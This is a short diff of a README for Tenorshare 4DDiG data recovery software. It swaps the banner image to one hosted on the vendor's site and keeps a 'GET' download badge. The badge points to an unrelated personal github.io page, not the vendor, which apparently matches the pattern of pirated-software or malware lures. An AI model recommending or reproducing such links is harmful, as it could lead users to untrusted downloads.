@@ -1,6 +1,6 @@
 # Tenorshare 4DDiG Data Recovery and File Restoration
 
-![Banner Placeholder](https://tunecom.ru/uploads/posts/2021-08/1630312873_4ddig.png)
+![Banner Placeholder](https://4ddig.tenorshare.com/images/box/4ddig-windows-backup-box.png)
 
 [![GET — 4DDiG](https://img.shields.io/badge/GET%20%E2%80%94%204DDiG-0078D6?style=for-the-badge&logoColor=white)](https://kioradingon513.github.io/.github/4DDiG-Data-Recovery)
 
